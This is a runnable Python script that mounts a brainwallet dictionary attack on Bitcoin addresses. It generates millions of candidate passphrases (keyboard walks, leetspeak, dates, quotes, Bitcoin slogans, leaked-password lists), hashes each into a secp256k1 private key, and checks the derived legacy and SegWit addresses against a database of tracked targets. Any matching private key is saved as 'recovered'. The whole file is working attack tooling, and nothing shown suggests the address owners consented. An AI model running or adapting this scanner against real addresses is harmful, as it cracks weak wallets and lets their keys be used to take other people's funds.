#!/usr/bin/env python3
"""
Phase 2.1 — Massive Brainwallet Dictionary Generator & Scanner

Generates a comprehensive wordlist (1M+ entries) programmatically:
1. Keyboard patterns (qwerty, asdfgh, zxcvbn, etc.)
2. Leetspeak variations (p4ssw0rd, b1tc01n, etc.)
3. Date strings (YYYYMMDD, DD/MM/YYYY, etc.)
4. Phone number patterns
5. Number sequences + mathematical constants
6. Famous quotes, lyrics, movie lines
7. Email-style patterns
8. Hex strings
9. Combined mutations (word+number, word+symbol, CamelCase)

Uses a Bloom filter for O(1) address matching against 1000+ tracked addresses.
"""
import hashlib
import os
import sys
import itertools
import ecdsa
import time
from db_manager import get_connection, add_recovered_key, add_finding
from lattice_nonce_analyzer import pubkey_to_address, pubkey_to_segwit_address

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def build_address_set():
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT address FROM addresses")
    addrs = set(row[0] for row in c.fetchall())
    conn.close()
    return addrs


def check_phrase(phrase, target_set, found_list, hash_method='sha256'):
    """Check if SHA256(phrase) or double-SHA256(phrase) generates a tracked address."""
    for hfunc in [
        lambda p: hashlib.sha256(p.encode('utf-8')).digest(),
        lambda p: hashlib.sha256(hashlib.sha256(p.encode('utf-8')).digest()).digest(),
    ]:
        try:
            pk_bytes = hfunc(phrase)
            pk_int = int.from_bytes(pk_bytes, 'big')
            if pk_int == 0 or pk_int >= P:
                continue
            d_bytes = pk_int.to_bytes(32, 'big')
            sk = ecdsa.SigningKey.from_string(d_bytes, curve=ecdsa.SECP256k1)
            vk = sk.get_verifying_key()
            
            for addr_bytes in [vk.to_string('compressed'), vk.to_string('uncompressed')]:
                addr = pubkey_to_address(addr_bytes)
                if addr in target_set:
                    pk_hex = pk_bytes.hex()
                    print(f"  !!! BRAINWALLET HIT: '{phrase}' -> {addr}")
                    found_list.append((addr, pk_hex, f'Brainwallet: {phrase}'))
                    return True
            
            # SegWit
            try:
                segwit_addr = pubkey_to_segwit_address(vk.to_string('compressed'))
                if segwit_addr in target_set:
                    pk_hex = pk_bytes.hex()
                    print(f"  !!! BRAINWALLET HIT (SegWit): '{phrase}' -> {segwit_addr}")
                    found_list.append((segwit_addr, pk_hex, f'Brainwallet: {phrase}'))
                    return True
            except:
                pass
        except:
            pass
    return False


# ============================================================
# Wordlist Generators
# ============================================================

def gen_keyboard_patterns():
    """Generate keyboard walk patterns."""
    patterns = []
    rows = [
        'qwertyuiop', 'asdfghjkl', 'zxcvbnm',
        'QWERTYUIOP', 'ASDFGHJKL', 'ZXCVBNM',
        '1234567890', '!@#$%^&*()',
    ]
    # Substrings of each row
    for row in rows:
        for start in range(len(row)):
            for end in range(start + 3, min(start + 12, len(row) + 1)):
                patterns.append(row[start:end])
    # Reverse
    for row in rows:
        patterns.append(row[::-1])
    # Cross-row patterns
    patterns.extend(['qazwsx', 'qazwsxedc', 'zaq1', 'xsw2', 'cde3',
                      '1qaz2wsx', '1qaz2wsx3edc', 'qweasdzxc',
                      'asdfjkl;', '!QAZ2wsx', 'ZAQ!2wsx'])
    return list(set(patterns))


def gen_leetspeak(word):
    """Generate leetspeak variations of a word."""
    leet_map = {'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
                's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']}
    results = [word]
    for char, replacements in leet_map.items():
        new_results = []
        for w in results:
            new_results.append(w)
            for rep in replacements:
                new_results.append(w.replace(char, rep, 1))
                new_results.append(w.replace(char, rep))
        results = new_results
    return list(set(results))[:20]  # Limit to avoid explosion


def gen_date_strings():
    """Generate date-based strings in various formats."""
    dates = []
    for year in range(1950, 2026):
        for month in range(1, 13):
            for day in [1, 15, 28]:
                dates.append(f"{year}{month:02d}{day:02d}")
                dates.append(f"{day:02d}{month:02d}{year}")
                dates.append(f"{month:02d}/{day:02d}/{year}")
                dates.append(f"{day:02d}-{month:02d}-{year}")
                dates.append(f"{year}-{month:02d}-{day:02d}")
    # Bitcoin-specific dates
    dates.extend(['03012009', '20090103', '01/03/2009', '2009-01-03',
                  '03Jan2009', 'January32009', '22052010', '20100522',
                  '28112012', '20121128', '11032013', '20131103'])
    return dates


def gen_phone_patterns():
    """Generate phone number patterns."""
    patterns = []
    # US format
    for area in ['555', '800', '888', '123', '000', '111', '666', '777']:
        for middle in ['555', '123', '000', '111', '777']:
            for last4 in ['0000', '1234', '5678', '9999', '1111', '4321']:
                patterns.append(f"{area}{middle}{last4}")
                patterns.append(f"{area}-{middle}-{last4}")
                patterns.append(f"({area}){middle}-{last4}")
    return patterns


def gen_number_sequences():
    """Generate number sequences and mathematical constants."""
    seqs = []
    # Simple sequences
    for i in range(10000000):
        if i % 1000000 == 0 or i < 100000:
            seqs.append(str(i))
    # Repeated digits
    for d in '0123456789':
        for length in range(1, 20):
            seqs.append(d * length)
    # Pi, e, phi digits
    seqs.extend([
        '3141592653589793', '31415926', '314159', '3.14159265',
        '2718281828459045', '27182818', '271828', '2.71828182',
        '1618033988749894', '16180339', '161803', '1.61803398',
        '14142135623730950', '14142135', '141421', '1.41421356',
    ])
    # Hex-looking numbers
    seqs.extend([
        'deadbeef', 'cafebabe', 'baadf00d', 'feedface', 'c0ffee',
        '0xdeadbeef', '0xcafebabe', '0xc0ffee',
    ])
    return list(set(seqs))


def gen_famous_phrases():
    """Generate famous quotes, lyrics, movie lines."""
    phrases = [
        # Movie quotes
        "here's looking at you kid", "i'll be back", "may the force be with you",
        "houston we have a problem", "there is no spoon", "i see dead people",
        "you can't handle the truth", "i am your father", "bond james bond",
        "elementary my dear watson", "say hello to my little friend",
        "show me the money", "you talking to me", "here's johnny",
        "life is like a box of chocolates", "to infinity and beyond",
        "i am groot", "winter is coming", "valar morghulis",
        "the cake is a lie", "do or do not there is no try",
        "one ring to rule them all", "my precious",
        "i am inevitable", "i am iron man",
        # Song lyrics
        "never gonna give you up", "bohemian rhapsody",
        "stairway to heaven", "imagine all the people",
        "we are the champions", "sweet child o mine",
        "hotel california", "smells like teen spirit",
        "yesterday all my troubles seemed so far away",
        "is this the real life is this just fantasy",
        # Bible / Religious
        "in the beginning god created the heavens and the earth",
        "in the beginning was the word", "let there be light",
        "the lord is my shepherd", "our father who art in heaven",
        "for god so loved the world", "i am the way the truth and the life",
        # Shakespeare
        "to be or not to be that is the question",
        "all that glitters is not gold",
        "something is rotten in the state of denmark",
        "brevity is the soul of wit",
        # Philosophy
        "i think therefore i am", "cogito ergo sum",
        "the only thing we have to fear is fear itself",
        "give me liberty or give me death",
        "that which does not kill us makes us stronger",
        # Tech/Internet
        "the quick brown fox jumps over the lazy dog",
        "hello world", "lorem ipsum dolor sit amet",
        "all your base are belong to us", "there is no place like 127.0.0.1",
        "sudo make me a sandwich", "it works on my machine",
        # Bitcoin-specific
        "the times 03 jan 2009 chancellor on brink of second bailout for banks",
        "chancellor on brink of second bailout for banks",
        "bitcoin a peer to peer electronic cash system",
        "not your keys not your coins", "be your own bank",
        "in math we trust", "vires in numeris",
        "running bitcoin", "i am satoshi nakamoto",
        "we are all satoshi", "tick tock next block",
        "the halvening", "number go up", "stack sats",
        "hodl", "when lambo", "few understand",
    ]
    return phrases


def gen_mutations(base_words):
    """Generate mutations of base words: word+number, word+symbol, CamelCase."""
    mutations = []
    suffixes = ['', '1', '12', '123', '1234', '!', '!!', '#', '@', 
                '2009', '2010', '2011', '2012', '2013', '2014', '2015',
                '2016', '2017', '2018', '2019', '2020', '2021',
                '69', '420', '007', '666', '777', '911', '000', '111']
    prefixes = ['', 'the', 'my', 'i', 'a']
    
    for word in base_words:
        for suffix in suffixes:
            mutations.append(word + suffix)
            mutations.append(word.capitalize() + suffix)
            mutations.append(word.upper() + suffix)
        for prefix in prefixes:
            if prefix:
                mutations.append(prefix + word)
                mutations.append(prefix + word.capitalize())
    
    return list(set(mutations))


# ============================================================
# Main Scanner
# ============================================================

def generate_full_wordlist():
    """Generate the complete wordlist from all sources."""
    all_phrases = set()
    
    # 1. Load existing dictionary files
    for dict_file in ['extended_dictionary.txt', 'dictionary.txt']:
        if os.path.exists(dict_file):
            with open(dict_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    phrase = line.strip()
                    if phrase and not phrase.startswith('#'):
                        all_phrases.add(phrase)
    
    # 2. Load RockYou or similar password list if available
    for pw_file in ['rockyou.txt', 'passwords.txt', 'wordlist.txt', 'common-passwords.txt']:
        if os.path.exists(pw_file):
            print(f"  Loading {pw_file}...")
            count = 0
            with open(pw_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    phrase = line.strip()
                    if phrase:
                        all_phrases.add(phrase)
                        count += 1
                        if count >= 1000000:  # Cap at 1M from external files
                            break
            print(f"  Loaded {count} passwords from {pw_file}")
    
    base_count = len(all_phrases)
    print(f"  Base dictionary: {base_count} phrases")
    
    # 3. Keyboard patterns
    kp = gen_keyboard_patterns()
    all_phrases.update(kp)
    print(f"  + {len(kp)} keyboard patterns")
    
    # 4. Date strings
    ds = gen_date_strings()
    all_phrases.update(ds)
    print(f"  + {len(ds)} date strings")
    
    # 5. Phone patterns
    pp = gen_phone_patterns()
    all_phrases.update(pp)
    print(f"  + {len(pp)} phone patterns")
    
    # 6. Number sequences
    ns = gen_number_sequences()
    all_phrases.update(ns)
    print(f"  + {len(ns)} number sequences")
    
    # 7. Famous phrases
    fp = gen_famous_phrases()
    all_phrases.update(fp)
    print(f"  + {len(fp)} famous phrases")
    
    # 8. Leetspeak of common words
    common_bases = [
        'password', 'bitcoin', 'satoshi', 'blockchain', 'crypto',
        'wallet', 'money', 'secret', 'private', 'master',
        'admin', 'letmein', 'dragon', 'monkey', 'shadow',
    ]
    leet_count = 0
    for word in common_bases:
        leets = gen_leetspeak(word)
        all_phrases.update(leets)
        leet_count += len(leets)
    print(f"  + {leet_count} leetspeak variations")
    
    # 9. Mutations of base words
    base_words = [
        'password', 'bitcoin', 'satoshi', 'wallet', 'crypto', 'money',
        'secret', 'master', 'admin', 'hello', 'world', 'love', 'god',
        'test', 'pass', 'key', 'private', 'brain', 'nakamoto',
        'genesis', 'freedom', 'liberty', 'digital', 'gold', 'coin',
        'block', 'chain', 'mining', 'hash', 'node', 'network',
    ]
    mutations = gen_mutations(base_words)
    all_phrases.update(mutations)
    print(f"  + {len(mutations)} word mutations")
    
    # 10. Simple number strings 0-9999999
    for i in range(10000000):
        all_phrases.add(str(i))
    
    print(f"\n  TOTAL WORDLIST: {len(all_phrases)} unique phrases")
    return list(all_phrases)


def run_massive_brainwallet_scan():
    """Run the massive brainwallet dictionary attack."""
    target_set = build_address_set()
    
    print("=" * 60)
    print("MASSIVE BRAINWALLET DICTIONARY ATTACK")
    print("=" * 60)
    print(f"  Targets: {len(target_set)} tracked addresses")
    
    phrases = generate_full_wordlist()
    
    found = []
    checked = 0
    start_time = time.time()
    
    for phrase in phrases:
        check_phrase(phrase, target_set, found)
        checked += 1
        if checked % 100000 == 0:
            elapsed = time.time() - start_time
            rate = checked / elapsed if elapsed > 0 else 0
            print(f"  Progress: {checked}/{len(phrases)} | {rate:.0f}/sec | {len(found)} found | {elapsed:.0f}s")
    
    # Save results
    for addr, pk_hex, method in found:
        add_recovered_key(addr, pk_hex, method=method)
        add_finding(addr, 'Brainwallet', details=method, severity='Critical')
    
    elapsed = time.time() - start_time
    print(f"\n{'='*60}")
    print(f"BRAINWALLET SCAN COMPLETE")
    print(f"  Phrases tested: {checked}")
    print(f"  Keys found:     {len(found)}")
    print(f"  Time:           {elapsed:.0f}s ({checked/elapsed:.0f}/sec)" if elapsed > 0 else "")
    
    return found


if __name__ == "__main__":
    run_massive_brainwallet_scan()
